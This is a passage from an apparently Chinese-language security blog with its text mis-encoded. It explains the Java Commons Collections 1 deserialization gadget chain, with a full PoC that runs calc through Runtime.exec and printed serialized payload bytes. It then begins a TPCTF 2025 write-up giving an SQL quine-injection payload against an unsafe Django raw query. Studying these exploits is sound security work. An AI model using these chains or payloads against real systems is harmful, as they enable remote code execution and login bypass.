class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">        <span class="comment">//...æŠ¥é”™å¤„ç†</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†ç”¨<code>ChainedTransformer</code>å°†è¿™ä¸¤ä¸ªç¿»è¯‘å™¨è¿èµ·æ¥<br>è¿™ä¸ªç¿»è¯‘å™¨ä¼šæŠŠè¾“å…¥æŒ‰é¡ºåºé€šè¿‡åˆ—è¡¨ä¸­çš„ç¿»è¯‘å™¨:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åªè¦æ‰§è¡Œä¸€å¥:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">transformerChain.transform(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥å®ç°å‘½ä»¤æ‰§è¡Œå¼¹å‡ºè®¡ç®—å™¨äº†</p><h3 id="æ„é€ åºåˆ—åŒ–æ•°æ®"><a href="#æ„é€ åºåˆ—åŒ–æ•°æ®" class="headerlink" title="æ„é€ åºåˆ—åŒ–æ•°æ®"></a>æ„é€ åºåˆ—åŒ–æ•°æ®</h3><p>ä½†åªæ˜¯æˆ‘ä»¬æœ¬åœ°æµ‹è¯•çš„ä¸€ä¸ªæ•ˆæœ<br>æƒ³åœ¨æœåŠ¡å™¨ä¸Šååºåˆ—åŒ–çš„è¿‡ç¨‹è§¦å‘è¿™ä¸ªæ“ä½œ<br>è¿˜éœ€è¦å€ŸåŠ©åˆ«çš„ä¸œè¥¿<br>æƒ³è¦ç›´æ¥æ‰§è¡Œä¸Šè¿°çš„<code>transform</code>æ–¹æ³•æ¯”è¾ƒå›°éš¾<br>å°†å…¶è½¬æ¢ä¸ºåˆ«çš„æ“ä½œ:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(</span><br><span class="line">    innerMap, </span><br><span class="line">    <span class="literal">null</span>,</span><br><span class="line">    transformerChain</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹<code>TransformedMap</code>è¿™ä¸ªç‰¹æ®Šçš„<code>Map</code>ç±»:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = transformKey(key);</span><br><span class="line">    value = transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (valueTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªç±»å¯ä»¥ä¼ å…¥ï¼š</p><ul><li>ä¸€ä¸ª<code>HashMap</code></li><li>ä¸€ä¸ªé”®ç¿»è¯‘å™¨</li><li>ä¸€ä¸ªå€¼ç¿»è¯‘å™¨</li></ul><p>è€Œååœ¨æ·»åŠ (<code>put</code>)æ–°çš„å…ƒç´ çš„æ—¶å€™<br>ä¼šå…ˆå°†é”®å€¼å¯¹åˆ†åˆ«ç¿»è¯‘åå†æ·»åŠ <br>æ­¤æ—¶å°±è§¦å‘äº†ç¿»è¯‘æ“ä½œ<br>è§¦å‘æ‰§è¡Œå‘½ä»¤çš„è¯­å¥ä»</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">transformerChain.transform(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure><p>è½¬æ¢ä¸ºäº†</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">outerMap.put(<span class="string">&quot;é”®&quot;</span>, <span class="string">&quot;å€¼&quot;</span>);</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚ä½•åœ¨åºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å®ç°è¿™ä¸ªæ·»åŠ å…ƒç´ çš„è¿‡ç¨‹å‘¢<br>éœ€è¦è¿›å…¥ä¸‹ä¸€æ­¥:</p><h4 id="AnnotationInvocationHandlerç±»"><a href="#AnnotationInvocationHandlerç±»" class="headerlink" title="AnnotationInvocationHandlerç±»"></a><code>AnnotationInvocationHandler</code>ç±»</h4><p>ä½äº:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sun.reflect.annotation.AnnotationInvocationHandler</span><br></pre></td></tr></table></figure><p>æ˜¯ Java æ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªå†…éƒ¨ç±»ï¼ˆä½äº sun.reflect.annotation åŒ…ï¼‰ï¼Œ<br>ä¸»è¦ç”¨äºå¤„ç†æ³¨è§£ï¼ˆAnnotationï¼‰çš„åŠ¨æ€ä»£ç†æœºåˆ¶ã€‚<br>å®ƒåœ¨ Java çš„åå°„å’Œæ³¨è§£å¤„ç†ä¸­æ‰®æ¼”é‡è¦è§’è‰²ï¼Œ<br>ä½†ç”±äºæ˜¯å†…éƒ¨ APIï¼Œå¼€å‘è€…é€šå¸¸ä¸ä¼šç›´æ¥ä½¿ç”¨å®ƒã€‚</p><ul><li>æ³¨è§£ï¼ˆä¸æ˜¯æ³¨é‡Šï¼‰ï¼š<br>æ³¨è§£æ˜¯ Java ä¸­çš„ä¸€ç§å…ƒæ•°æ®ï¼ˆMetadataï¼‰â€‹æœºåˆ¶ï¼Œç”¨äºä¸ºä»£ç ï¼ˆç±»ã€æ–¹æ³•ã€å­—æ®µç­‰ï¼‰æ·»åŠ é¢å¤–çš„ç»“æ„åŒ–ä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯å¯ä»¥è¢«ç¼–è¯‘å™¨ã€å¼€å‘å·¥å…·æˆ–è¿è¡Œæ—¶æ¡†æ¶ï¼ˆå¦‚ Springã€Hibernateï¼‰è¯»å–ï¼Œå¹¶æ ¹æ®æ³¨è§£çš„å†…å®¹æ‰§è¡Œç‰¹å®šæ“ä½œã€‚<br>ç›¸å½“äºç»™ç¼–è¯‘å™¨çœ‹çš„æ³¨é‡Šè€Œéç»™äººçœ‹çš„ã€‚</li></ul><p>çœ‹çœ‹ä»–çš„<code>readObject</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var10 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var10.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(Map.Entry var5 : <span class="built_in">this</span>.memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var10.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨ä¸€ä¸ªforå¾ªç¯å¯¹<code>this.memberValues</code>å±æ€§è¿›è¡Œäº†ä¸€ç³»åˆ—çš„æ“ä½œ<br>è¿™ä¸ªå±æ€§å°±æ˜¯æˆ‘ä»¬çš„mapï¼Œçœ‹çœ‹æ„é€ æ–¹æ³•:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†æˆ‘ä»¬çš„<code>outerMap</code>ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥èµ‹å€¼ç»™<code>memberValues</code><br>è§¦å‘æ·»åŠ å…ƒç´ :</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure><p>å°†handlerè¾“å‡ºä¸ºåºåˆ—åŒ–å­—ç¬¦ä¸²<br>å°±æ˜¯æˆ‘ä»¬çš„payload:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(handler);</span><br><span class="line">oos.close();</span><br><span class="line">System.out.println(barr);</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">iTransformerst -[Lorg/apache/commons/collections/Transformer;xpur -[Lorg.apache.commons.collections.Transformer;ï¿½V*ï¿½ï¿½4ï¿½  xp   sr ;org.apache.commons.collections.functors.ConstantTransformerXvï¿½Aï¿½ï¿½ L iConstantt Ljava/lang/Object;xpvr java.lang.Runtime           xpsr :org.apache.commons.collections.functors.InvokerTransformerï¿½ï¿½ï¿½k&#123;|ï¿½8 [ iArgst [Ljava/lang/Object;L iMethodNamet Ljava/lang/String;[ iParamTypest [Ljava/lang/Class;xpur [Ljava.lang.Object;ï¿½ï¿½Xï¿½s)l  xp   t </span><br><span class="line">getRuntimeur [Ljava.lang.Class;ï¿½×®ï¿½ï¿½Zï¿½  xp    t getMethoduq ~    vr java.lang.Stringï¿½ï¿½8z;ï¿½B  xpvq ~ sq ~ uq ~    puq ~     t invokeuq ~    vr java.lang.Object           xpvq ~ sq ~ ur [Ljava.lang.String;ï¿½ï¿½Vï¿½ï¿½&#123;G  xp   t calct execuq ~    q ~ sr java.util.HashMapï¿½ï¿½ï¿½`ï¿½ F </span><br><span class="line">loadFactorI thresholdxp?@           t valuet xxxxxxvr java.lang.annotation.Retention           xp</span><br></pre></td></tr></table></figure><p>å‡å¦‚å­˜åœ¨æŸä¸ªè¿™æ ·çš„æ¼æ´ç‚¹:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(newByteArrayInputStream(barr.toByteArray()));</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br></pre></td></tr></table></figure><p>æŒ‰ç†è¯´å°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ä»£ç äº†<br>ä¸è¿‡è¿˜å­˜åœ¨æœ€åä¸€ä¸ªé—®é¢˜<br>é‚£å°±æ˜¯<code>Runtime</code>ç±»äº‹å®ä¸Šæ²¡æœ‰å®ç°<code>Serializable</code>æ¥å£<br>å¯¼è‡´æ— æ³•è¢«åºåˆ—åŒ–<br><strong>æ€ä¹ˆåŠï¼Ÿ</strong><br>åœ¨JVMä¸­ï¼Œæ¯ä¸ªç±»åŠ è½½åéƒ½ä¼šç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„<code>Class</code>å¯¹è±¡ï¼Œ<br>ç”¨æ¥è¡¨ç¤ºè¯¥ç±»çš„ç±»å‹ä¿¡æ¯ï¼Œè·å–æ–¹å¼ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ç±»å.class</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„ï¼Œä½¿ç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.class</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥è·å–åˆ°Runtimeçš„Classå¯¹è±¡<br>è¿™ä¸ªå¯¹è±¡å¯ä»¥è¿›è¡Œåå°„è°ƒç”¨è·å–Runtimeå¹¶æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">f</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) f.invoke(<span class="literal">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ¢ä¸€æ¡ç¿»è¯‘é“¾å­äº†ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// å¼¹å‡ºè®¡ç®—å™¨ï¼ˆWindowsï¼‰</span></span><br><span class="line">        )</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å®Œæ•´poc:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class</span><br><span class="line">                &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;</span><br><span class="line">                                <span class="string">&quot;calc&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">                transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">                Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">                Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)</span><br><span class="line">                construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆé•¿å¾ˆç»•ï¼Œè®©è‡ªå·±æ¥æŒ–åšä¸åˆ°<br>å°¤å…¶æ˜¯æ³¨è§£ç±»ï¼Œå‘ç°ä¸äº†ï¼Œå®¡ä¸æ˜ç™½<br>æ€è·¯å­¦ä¸€è¾ˆå­</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tpctf2025</title>
      <link href="/2025/03/12/2025tpctf/"/>
      <url>/2025/03/12/2025tpctf/</url>
      
        <content type="html"><![CDATA[<h1 id="tpctf-webå¤ç°"><a href="#tpctf-webå¤ç°" class="headerlink" title="tpctf webå¤ç°"></a>tpctf webå¤ç°</h1><h3 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>(<span class="params">request:HttpRequest</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;Welcome to TPCTF 2025&#x27;</span>)</span><br><span class="line">    username = request.POST.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;you are not admin.&#x27;</span>)</span><br><span class="line">    password = request.POST.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    users:AdminUser = AdminUser.objects.raw(<span class="string">&quot;SELECT * FROM blog_adminuser WHERE username=&#x27;%s&#x27; and password =&#x27;%s&#x27;&quot;</span> % (username,password))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">assert</span> password == users[<span class="number">0</span>].password</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;wrong password&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ ¹æ®è¿™ä¸ªflagæ¥å£åˆ¤æ–­<br>è¾“å…¥çš„å¯†ç è¦ä¸æŸ¥è¯¢å‡ºæ¥çš„å¯†ç ç›¸åŒ<br>æ‰€ä»¥è¦ä¹ˆæƒ³åŠæ³•è·å¾—çœŸæ­£çš„å¯†ç <br>è¦ä¹ˆè¾“å‡ºå’ŒæŸ¥è¯¢è¯­å¥ä¸€æ ·çš„è¯­å¥<br>è¿™ç§æ³¨å…¥å«åš<code>quineæ³¨å…¥</code><br>ä»åŸºç¡€ç¤ºä¾‹ç†è§£:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">replace(</span><br><span class="line">    <span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,</span><br><span class="line">    <span class="type">char</span>(<span class="number">46</span>),</span><br><span class="line">    <span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å®é™…payloadè¦åŠ å¾ˆå¤šä¸œè¥¿æ¥é—­åˆ<br>æ‰€ä»¥å®é™…payloadç»“æ„å¦‚ä¸‹:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>, </span><br><span class="line">  REPLACE(</span><br><span class="line">    REPLACE(</span><br><span class="line">      <span class="string">&#x27;[Inner_String]&#x27;</span>, </span><br><span class="line">      <span class="type">CHAR</span>(<span class="number">34</span>), <span class="type">CHAR</span>(<span class="number">39</span>)</span><br><span class="line">    ), </span><br><span class="line">    <span class="type">CHAR</span>(<span class="number">36</span>), </span><br><span class="line">    <span class="string">&#x27;[Outer_String]&#x27;</span></span><br><span class="line">  ) <span class="operator">||</span> <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>payloadä¸º</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT 1,2, </span></span><br><span class="line"><span class="string">    REPLACE(</span></span><br><span class="line"><span class="string">        REPLACE(&#x27;</span></span><br><span class="line">            &quot; UNION SELECT 1,2, REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) || &quot;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ,CHAR(34),CHAR(39)</span></span><br><span class="line"><span class="string">            ),</span></span><br><span class="line"><span class="string">            CHAR(36),</span></span><br><span class="line"><span class="string">            &#x27;</span>&quot; UNION SELECT 1,2, REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) || &quot;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    ) || &#x27;</span></span><br></pre></td></tr></table></figure><p>ä¹‹åéœ€è¦ç»•è¿‡goçš„ä¸€ä¸ªwaf<br>é˜²çš„å¾ˆä¸¥ï¼Œéœ€è¦ç”¨ä¸€ä¸ªç‰¹æ€§ç»•è¿‡<br>ä½¿å…¶ä¸è§£æ<br><a 